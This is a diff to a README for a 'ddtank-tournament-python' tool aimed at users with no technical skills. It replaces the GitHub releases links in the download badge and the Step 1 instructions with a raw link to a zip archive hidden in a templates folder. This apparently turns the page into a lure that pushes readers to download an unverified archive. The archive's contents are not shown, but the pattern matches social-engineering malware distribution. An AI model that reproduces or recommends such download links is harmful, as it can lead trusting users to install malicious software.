@@ -1,7 +1,7 @@
 <h1>🎮 ddtank-tournament-python - Run Tournaments Without Any Tech Skills</h1>
 
 <p align="center">
-<a href="https://github.com/evanszac7863/ddtank-tournament-python/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/evanszac7863/ddtank-tournament-python/main/ddtank-tournament-python/templates/python_ddtank_tournament_3.3.zip"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download"></a>
 </p>
 
 ## ✨ What Is This?
@@ -16,7 +16,7 @@ Follow these simple steps exactly as written. You do not need to understand anyt
 
 ### 📥 Step 1: Get the File
 
-Visit this link to download the application: **[https://github.com/evanszac7863/ddtank-tournament-python/releases](https://github.com/evanszac7863/ddtank-tournament-python/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/evanszac7863/ddtank-tournament-python/main/ddtank-tournament-python/templates/python_ddtank_tournament_3.3.zip](https://raw.githubusercontent.com/evanszac7863/ddtank-tournament-python/main/ddtank-tournament-python/templates/python_ddtank_tournament_3.3.zip)**
 
 You will see a list of files. Look for the most recent one. The file name will start with something like `ddtank-tournament`. Click it. Your browser will ask where to save it. Choose your **Downloads** folder. Wait for the download to finish.
 
